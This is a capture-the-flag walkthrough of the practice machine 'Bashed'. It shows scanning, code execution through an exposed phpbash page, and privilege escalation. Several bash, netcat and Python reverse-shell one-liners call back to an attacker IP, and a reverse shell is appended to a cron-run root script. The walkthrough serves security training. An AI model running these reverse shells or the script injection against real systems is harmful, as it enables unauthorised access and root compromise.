---
description: 10.10.10.68
---

# Bashed

![](<../../.gitbook/assets/1 (6).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Web enumeration finds PHPBASH webapp which gives us RCE. Use to get shell as "www-data". User can run any command as "scriptmanager" via sudo. Switch user to "scriptmanager".
* Root - User "scriptmanager" can write to python script which is being executed by root every minute. Update script to get shell as "root".

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.68                                                                                    130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-25 07:16 EST
Nmap scan report for 10.10.10.68
Host is up (0.080s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.85 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sC -sV -p 80 10.10.10.68 -n                                                    
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-25 07:17 EST
Nmap scan report for 10.10.10.68
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
                                                                     
```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.68/
http://10.10.10.68/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]  

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.68/ -C all     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.68
+ Target Hostname:    10.10.10.68
+ Target Port:        80
+ Start Time:         2021-11-25 07:18:27 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /php/: Directory indexing found.
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26471 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2021-11-25 07:29:08 (GMT-5) (641 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.68/ -q -f -t 100 -x php,sh,bak,txt
/uploads/ (Status: 200)
/php/ (Status: 200)
/images/ (Status: 200)
/css/ (Status: 200)
/icons/ (Status: 403)
/dev/ (Status: 200)
/js/ (Status: 200)
/config.php (Status: 200)
/fonts/ (Status: 200)
/server-status/ (Status: 403)
                              
```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Nothing revealed in the page source
* There are a few routes to check out: /uploads, /php, /dev and config.php all look interesting
* There is mention of a phpbash page implemented "on this exact server"

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing found in the scripts

#### Browsing

The home page:

![](<../../.gitbook/assets/2 (5) (1).JPG>)

Going into the "phpbash" post, we see the following page:

![](<../../.gitbook/assets/3 (2).JPG>)

![](<../../.gitbook/assets/4 (4).JPG>)

The page URL in the example image shown is at /uploads/phpbash.php, however, when we try visit the page we get a not found error.

Let's check out the routes found by gobuster and nikto:

> /uploads/ --> nothing in here
>
> /php/ --> contains one file: sendMail.php (loads but no output)
>
> /dev/ --> contains two files: phpbash.min.php and phpbash.php
>
> /config.php --> loads but no output

Let's visit the page at /dev/phpbash.php

![](<../../.gitbook/assets/5 (4).JPG>)

Nice, we have command execution.

## Gaining Access

Let's try an get a reverse shell:

> bash -i >& /dev/tcp/10.10.14.7/9999 0>&1&#x20;
>
> bash -i >& /dev/tcp/10.10.14.7/9999 0<&1 2>&1
>
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 9999 >/tmp/f

None of them work. Let's try uploading a shell script and then executing it. First, create the script as follows:

```
└─$ cat rev.sh                                                                                               
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.7/9999 0>&1
                                          
```

Next, start a web server in the directory containing the script:

```
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Start a netcat listener:

```
└─$ nc -nvlp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999

```

Back in the browser, let's navigate to /tmp, download the shell script, change permissions on it if necessary, and then run it:

![](<../../.gitbook/assets/6 (2) (1).JPG>)

In our netcat listener, we get a shell as "www-data":

```
└─$ nc -nvlp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.68.
Ncat: Connection from 10.10.10.68:50850.
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/tmp$ 
```

We can also grab the user flag as shown below:

```
www-data@bashed:/tmp$ cd /home
cd /home
www-data@bashed:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root          root          4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
drwxr-xr-x  4 arrexel       arrexel       4096 Dec  4  2017 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager
www-data@bashed:/home$ cd arrexel
cd arrexel
www-data@bashed:/home/arrexel$ ls -la
ls -la
total 36
drwxr-xr-x 4 arrexel arrexel 4096 Dec  4  2017 .
drwxr-xr-x 4 root    root    4096 Dec  4  2017 ..
-rw------- 1 arrexel arrexel    1 Dec 23  2017 .bash_history
-rw-r--r-- 1 arrexel arrexel  220 Dec  4  2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec  4  2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec  4  2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
-rw-r--r-- 1 arrexel arrexel  655 Dec  4  2017 .profile
-rw-r--r-- 1 arrexel arrexel    0 Dec  4  2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel   33 Dec  4  2017 user.txt
www-data@bashed:/home/arrexel$ cat user.txt
cat user.txt
2c281f318555dbc1b856957c7147bfc1
www-data@bashed:/home/arrexel$ 

```

## Enumeration as "www-data"

Let's see if we can run any commands with sudo:

```
www-data@bashed:/home/arrexel$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/arrexel$
```

We can run any command as user "scriptmanager". let's upgrade our shell and then see if we can switch user:

```
www-data@bashed:/home/arrexel$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<el$ python3 -c 'import pty; pty.spawn("/bin/bash")'                         
www-data@bashed:/home/arrexel$ sudo -i -u scriptmanager
sudo -i -u scriptmanager
scriptmanager@bashed:~$ id
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
scriptmanager@bashed:~$ 
```

## Enumeration as "scriptmanager"

Let's search for files owned by this user:

```
scriptmanager@bashed:~$ find / -path /proc -prune -o -user scriptmanager 2>/dev/null
<d / -path /proc -prune -o -user scriptmanager 2>/dev/null                   
/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
/home/scriptmanager/linpeas.sh
/home/scriptmanager/.gnupg
/home/scriptmanager/.gnupg/trustdb.gpg
/home/scriptmanager/.gnupg/pubring.gpg
/home/scriptmanager/.gnupg/gpg.conf
/proc
scriptmanager@bashed:~$ 
```

There is a "/scripts" directory in root, with a python script in it. Let's check it out:

```
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 25 06:57 test.txt
scriptmanager@bashed:/scripts$ date
date
Thu Nov 25 06:57:49 PST 2021
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 25 06:57 test.txt
scriptmanager@bashed:/scripts$ date
date
Thu Nov 25 06:58:04 PST 2021
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 25 06:58 test.txt
scriptmanager@bashed:/scripts$ 
```

It's a very simple script, and looking at the timestamps for the test.txt file, it looks like th script is being run every minute by root.&#x20;

## Privilege Escalation

Because we can write to the script, we can modify it to execute commands as root. Let's use it to get a reverse shell. First start a netcat listener, then update the "/scripts/test.py" file as follows:

```
scriptmanager@bashed:/scripts$ cat <<EOF >> test.py
cat <<EOF >> test.py
> import socket,subprocess,os
import socket,subprocess,os
> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
> s.connect(("10.10.14.7",9998))
s.connect(("10.10.14.7",9998))
> os.dup2(s.fileno(),0)
os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
os.dup2(s.fileno(),2)
> p=subprocess.call(["/bin/bash","-i"])
p=subprocess.call(["/bin/bash","-i"])
> EOF
EOF
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",9998))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
scriptmanager@bashed:/scripts$ 

```

After less than a minute, we get a root shell, and we can grab the root flag:

```
└─$ nc -nvlp 9998                                                                                           130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9998
Ncat: Listening on 0.0.0.0:9998
Ncat: Connection from 10.10.10.68.
Ncat: Connection from 10.10.10.68:49656.
bash: cannot set terminal process group (23430): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bashed:/scripts# cd /root
cd /root
root@bashed:~# ls
ls
root.txt
root@bashed:~# cat root.txt
cat root.txt
cc4f0afe3a1026d402ba10329674a8e2
root@bashed:~#  
```

## Resources

{% embed url="https://github.com/Arrexel/phpbash" %}

